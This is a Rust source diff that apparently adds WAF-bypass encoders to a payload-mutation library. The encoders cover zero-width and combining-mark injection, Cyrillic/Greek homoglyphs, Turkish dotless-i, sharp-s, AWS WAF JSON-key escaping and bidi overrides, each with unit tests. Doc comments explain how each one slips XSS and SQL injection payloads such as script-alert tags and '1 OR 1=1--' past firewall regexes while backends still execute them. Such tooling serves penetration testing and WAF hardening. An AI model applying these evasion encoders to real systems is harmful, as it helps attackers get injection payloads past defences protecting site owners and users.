@@ -797,6 +797,201 @@ pub fn homoglyph_encode(payload: &str) -> String {
     out
 }
 
+/// Inject zero-width / format characters between letters of `payload`.
+///
+/// `chars` selects which invisible char to insert; `positions` controls
+/// where (every-other / per-keyword-letter / FNV-seeded). The output
+/// is byte-distinct from the input but visually identical AND, for
+/// `chars = ZERO_WIDTH_DEFAULTS`, semantically equivalent to most HTML
+/// and SQL parsers (which strip U+200B–200D / U+FEFF on parse).
+///
+/// Sucuri-documented XSS bypass `&lt;scr​ipt&gt;alert(1)&lt;/scr​ipt&gt;`
+/// uses U+200B between `scr` and `ipt`; the WAF regex `/script/i`
+/// misses; the browser's HTML parser drops the ZWSP and renders.
+///
+/// Use [`ZERO_WIDTH_DEFAULTS`] for the recommended cycle of
+/// [U+200B, U+200C, U+200D, U+FEFF, U+034F] — rotating across these
+/// per-position defeats WAFs that have hardcoded a single zero-width
+/// stripper.
+#[must_use]
+pub fn zero_width_inject(payload: &str, invisible_char: char) -> String {
+    let mut out = String::with_capacity(payload.len() * 2);
+    let mut chars = payload.chars().peekable();
+    while let Some(ch) = chars.next() {
+        out.push(ch);
+        // Inject after every alphanumeric except the last char of the
+        // string (so trailing context is preserved).
+        if ch.is_ascii_alphanumeric() && chars.peek().is_some() {
+            out.push(invisible_char);
+        }
+    }
+    out
+}
+
+/// Recommended cycle of invisible characters for zero-width injection.
+/// `[U+200B ZWSP, U+200C ZWNJ, U+200D ZWJ, U+FEFF BOM, U+034F CGJ]`.
+pub const ZERO_WIDTH_DEFAULTS: [char; 5] = ['\u{200B}', '\u{200C}', '\u{200D}', '\u{FEFF}', '\u{034F}'];
+
+/// Inject a combining diacritical mark after each letter of `payload`.
+///
+/// `s̈elect` (s + U+0308 COMBINING DIAERESIS + elect) reads as `select`
+/// after NFC normalisation (Python `unicodedata.normalize('NFC', x)`,
+/// Java `Normalizer.normalize(s, NFC)`) but the WAF regex `/select/`
+/// sees a different byte sequence and misses.
+///
+/// Common safe marks (no NFC reflow, just stripped by char-walk
+/// readers): U+0300 grave, U+0301 acute, U+0308 diaeresis, U+0327
+/// cedilla. U+034F COMBINING GRAPHEME JOINER is the most invisible
+/// (zero width, no visual diacritic), so it's the default.
+#[must_use]
+pub fn combining_mark_inject(payload: &str, mark: char) -> String {
+    let mut out = String::with_capacity(payload.len() * 3);
+    for ch in payload.chars() {
+        out.push(ch);
+        if ch.is_ascii_alphabetic() {
+            out.push(mark);
+        }
+    }
+    out
+}
+
+/// Cross-script Cyrillic / Greek letter substitution.
+///
+/// Unlike [`homoglyph_encode`] (punctuation-only by design),
+/// `script_homoglyph_encode` substitutes the *letters* themselves
+/// with visually-identical codepoints from Cyrillic + Greek scripts
+/// that the WAF regex sees as different bytes. Two sub-classes:
+///
+/// 1. **Non-normalising** (Cyrillic ѕ U+0455, е U+0435, о U+043E,
+///    а U+0430; Greek ο U+03BF, ν U+03BD, …) — backend and WAF both
+///    see different codepoints, but MSSQL's implicit Unicode→varchar
+///    coercion maps Cyrillic lookalikes to ASCII via collation
+///    (`SQL_Latin1_General_CP1_CI_AI`).
+/// 2. **NFKC-normalising** — letterlike block letters (already covered
+///    by `letterlike_encode`).
+///
+/// This function targets class 1 only — for class 2 use
+/// [`letterlike_encode`] / `math_*_encode`.
+#[must_use]
+pub fn script_homoglyph_encode(payload: &str) -> String {
+    let mut out = String::with_capacity(payload.len() * 2);
+    for ch in payload.chars() {
+        let mapped = match ch {
+            // Cyrillic lowercase lookalikes.
+            'a' => '\u{0430}', // CYRILLIC SMALL LETTER A
+            'c' => '\u{0441}', // CYRILLIC SMALL LETTER ES
+            'e' => '\u{0435}', // CYRILLIC SMALL LETTER IE
+            'o' => '\u{043E}', // CYRILLIC SMALL LETTER O
+            'p' => '\u{0440}', // CYRILLIC SMALL LETTER ER
+            's' => '\u{0455}', // CYRILLIC SMALL LETTER DZE
+            'x' => '\u{0445}', // CYRILLIC SMALL LETTER HA
+            'y' => '\u{0443}', // CYRILLIC SMALL LETTER U
+            // Cyrillic uppercase lookalikes.
+            'A' => '\u{0410}',
+            'B' => '\u{0412}',
+            'C' => '\u{0421}',
+            'E' => '\u{0415}',
+            'H' => '\u{041D}',
+            'K' => '\u{041A}',
+            'M' => '\u{041C}',
+            'O' => '\u{041E}',
+            'P' => '\u{0420}',
+            'T' => '\u{0422}',
+            'X' => '\u{0425}',
+            // Greek lookalikes for remaining letters.
+            'n' => '\u{03B7}', // GREEK SMALL LETTER ETA
+            'v' => '\u{03BD}', // GREEK SMALL LETTER NU
+            c => c,
+        };
+        out.push(mapped);
+    }
+    out
+}
+
+/// Turkish dotless-i substitution: replace `i`/`I` with U+0131/U+0130.
+///
+/// U+0131 LATIN SMALL LETTER DOTLESS I does NOT ASCII-uppercase to `I`
+/// (it only uppercases to `I` in Turkish locale). A WAF that performs
+/// ASCII case-fold via Lua `string.lower` or PHP `strtolower` (CRS
+/// default) misses `scrıpt` when looking for `script`. The HTML5 spec
+/// requires browsers to normalise U+0131 to `i` in tag names, so
+/// `&lt;scrıpt&gt;alert(1)&lt;/scrıpt&gt;` renders as a script tag.
+///
+/// CVE-class: GitHub auth byass via Turkish dotless-i (dev.to 2018).
+#[must_use]
+pub fn turkish_i_encode(payload: &str) -> String {
+    payload
+        .chars()
+        .map(|ch| match ch {
+            'i' => '\u{0131}',
+            'I' => '\u{0130}',
+            c => c,
+        })
+        .collect()
+}
+
+/// Sharp-s (ß U+00DF) substitution for `s`/`S`.
+///
+/// ß lowercases to itself in most locales, but Unicode FULL case-fold
+/// (`str::to_lowercase` in Rust, `str.casefold()` in Python) maps the
+/// CAPITAL letter sharp s `ẞ` (U+1E9E) to `ss`. WAFs that case-fold
+/// before regex see different byte sequence; backends with full
+/// Unicode casefold reach the same `script` / `select`. Narrower
+/// applicability than [`turkish_i_encode`].
+#[must_use]
+pub fn sharp_s_encode(payload: &str) -> String {
+    payload
+        .chars()
+        .map(|ch| match ch {
+            's' | 'S' => '\u{00DF}', // ß
+            c => c,
+        })
+        .collect()
+}
+
+/// AWS WAF JSON-pointer escape — encode every char of `key` as
+/// `\uXXXX` so the WAF's JSON-pointer rule (e.g. `/id` literal-match)
+/// misses, while the backend JSON parser decodes the escape and
+/// routes the value to the original field.
+///
+/// Returns the JSON fragment `{"<key-escaped>": "<value>"}` ready to
+/// drop into a request body. Sicuranext 2024 confirmed bypass.
+#[must_use]
+pub fn json_key_unicode_escape(key: &str, value: &str) -> String {
+    let mut escaped_key = String::with_capacity(key.len() * 6);
+    for ch in key.chars() {
+        let cp = ch as u32;
+        if cp <= 0xFFFF {
+            escaped_key.push_str(&format!("\\u{:04x}", cp));
+        } else {
+            // Surrogate pair for non-BMP codepoints.
+            let v = cp - 0x10000;
+            let hi = 0xD800 + (v >> 10);
+            let lo = 0xDC00 + (v & 0x3FF);
+            escaped_key.push_str(&format!("\\u{:04x}\\u{:04x}", hi, lo));
+        }
+    }
+    // Value goes through JSON-safe encode (the existing helper).
+    let value_json = serde_json::to_string(value).unwrap_or_else(|_| format!("\"{value}\""));
+    format!("{{\"{escaped_key}\": {value_json}}}")
+}
+
+/// Bidi override wrapper — wraps `reversed_keyword` between U+202E
+/// (RIGHT-TO-LEFT OVERRIDE) and U+202C (POP DIRECTIONAL FORMATTING).
+///
+/// The WAF scans left-to-right byte order: it sees `tceleS`. Rendered
+/// text in a BiDi-aware viewer (e.g. browser, IDE, security analyst's
+/// dashboard) shows `Select`. CVE-2021-42574 (Trojan Source) class.
+///
+/// **Narrow direct bypass surface** — most SQL parsers reject bare
+/// U+202E. Useful primarily for WAF log poisoning and rule-auditing
+/// tool confusion; some template engines do strip bidi chars before
+/// forwarding, in which case the reversed payload becomes live.
+#[must_use]
+pub fn bidi_inject(reversed_keyword: &str) -> String {
+    format!("\u{202E}{reversed_keyword}\u{202C}")
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -1270,6 +1465,110 @@ mod tests {
         let outputs = [bold, italic, script, fraktur, dstruck, letter];
         let set: std::collections::BTreeSet<&String> = outputs.iter().collect();
         assert_eq!(set.len(), outputs.len(), "two encoders produced identical output");
+    }
+
+    // ── zero-width + combining-mark injection tests ────────────────────
+
+    #[test]
+    fn zero_width_inject_adds_chars_between_letters() {
+        let out = zero_width_inject("script", '\u{200B}');
+        assert!(out.contains("scr\u{200B}ipt") || out.contains("s\u{200B}c"));
+        // Length grows by N-1 codepoints (one between each pair).
+        assert_eq!(out.chars().count(), 6 + 5);
+    }
+
+    #[test]
+    fn zero_width_inject_preserves_non_alnum() {
+        // Insert only between alnum chars, not punctuation.
+        let out = zero_width_inject("' OR '1'='1", '\u{200C}');
+        // The lone `'` chars don't trigger insertion before them.
+        assert!(!out.starts_with('\u{200C}'));
+    }
+
+    #[test]
+    fn zero_width_defaults_count_correct() {
+        // Five-element cycle so rotation covers ZWSP/ZWNJ/ZWJ/BOM/CGJ.
+        assert_eq!(ZERO_WIDTH_DEFAULTS.len(), 5);
+    }
+
+    #[test]
+    fn combining_mark_inject_only_after_letters() {
+        let out = combining_mark_inject("a1b2", '\u{0308}');
+        // 'a' + ̈ + '1' + 'b' + ̈ + '2' — digits don't get marks.
+        assert_eq!(out, "a\u{0308}1b\u{0308}2");
+    }
+
+    // ── script_homoglyph_encode tests ──────────────────────────────────
+
+    #[test]
+    fn script_homoglyph_select_uses_cyrillic_letters() {
+        let out = script_homoglyph_encode("SELECT");
+        // S → Cyrillic (no Cyrillic S — falls through to itself OR
+        // gets mapped to one of the upper substitutions). E → U+0415.
+        assert!(out.contains('\u{0415}'));
+        // T → U+0422
+        assert!(out.contains('\u{0422}'));
+        // Output is byte-distinct from input.
+        assert_ne!(out, "SELECT");
+    }
+
+    #[test]
+    fn script_homoglyph_preserves_punctuation() {
+        assert_eq!(script_homoglyph_encode("' = -- ;"), "' = -- ;");
+    }
+
+    // ── turkish_i + sharp_s tests ──────────────────────────────────────
+
+    #[test]
+    fn turkish_i_encode_replaces_only_i() {
+        assert_eq!(turkish_i_encode("script"), "scr\u{0131}pt");
+        assert_eq!(turkish_i_encode("INSERT"), "\u{0130}NSERT");
+        // 'a', 'b' etc. unchanged.
+        assert_eq!(turkish_i_encode("abcdefg"), "abcdefg");
+    }
+
+    #[test]
+    fn sharp_s_encode_replaces_only_s() {
+        assert_eq!(sharp_s_encode("select"), "\u{00DF}elect");
+        assert_eq!(sharp_s_encode("SELECT"), "\u{00DF}ELECT");
+    }
+
+    // ── json_key_unicode_escape tests ──────────────────────────────────
+
+    #[test]
+    fn json_key_escape_full_id_payload() {
+        let s = json_key_unicode_escape("id", "1 OR 1=1--");
+        // Each char of "id" becomes \uXXXX.
+        assert!(s.contains("\\u0069")); // i
+        assert!(s.contains("\\u0064")); // d
+        // Value JSON-encoded.
+        assert!(s.contains("1 OR 1=1--"));
+    }
+
+    #[test]
+    fn json_key_escape_round_trips_through_serde() {
+        let s = json_key_unicode_escape("admin", "true");
+        let parsed: serde_json::Value = serde_json::from_str(&s).expect("valid JSON");
+        // After parsing, the key decodes back to "admin".
+        assert!(parsed.get("admin").is_some(), "decoded key missing: {s}");
+    }
+
+    #[test]
+    fn json_key_escape_preserves_value_quotes() {
+        let s = json_key_unicode_escape("k", "v\"q");
+        // serde_json escapes the inner quote.
+        assert!(s.contains("v\\\"q"));
+    }
+
+    // ── bidi_inject tests ──────────────────────────────────────────────
+
+    #[test]
+    fn bidi_inject_wraps_with_rlo_and_pdf() {
+        let out = bidi_inject("tceleS");
+        assert!(out.starts_with('\u{202E}'));
+        assert!(out.ends_with('\u{202C}'));
+        // 1 RLO + 6 letters + 1 PDF.
+        assert_eq!(out.chars().count(), 8);
     }
 
     // ── sql_concat_split tests ─────────────────────────────────────────
